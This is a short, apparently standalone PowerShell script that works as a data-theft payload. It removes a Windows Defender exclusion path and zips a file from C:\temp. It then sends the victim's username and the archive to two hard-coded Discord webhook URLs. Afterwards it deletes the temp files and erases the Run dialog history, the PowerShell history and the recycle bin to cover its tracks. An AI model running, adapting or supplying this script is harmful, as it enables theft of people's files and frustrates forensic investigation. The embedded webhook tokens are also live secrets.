Remove-MpPreference -ExclusionPath “C:”
$hookurl='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'
$hookurl2='https://discord.com/api/webhooks/1189972666506039399/noWdQFFczREOMIlEBSeX4kwfMaDTRr7rSAWD9_kgG--ZeM8wf4MxIds88dGQYoPl9wOq'
$fileSaveDir = 'C:\temp'
$date = get-date
$filename = 'j'
$filepath = Get-ChildItem -Path "$fileSaveDir" -Filter "$filename" -Recurse | % {$_.FullName}
Compress-Archive -Path $fileSaveDir\j.txt -DestinationPath c:\export.zip -Force
$Body = @{'username' = $env:username; 'content' = "Magia pura"}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl
Start-Sleep -Seconds 1.5
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl2
rm -r C:\temp
rm -r C:\export.zip

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
EXIT
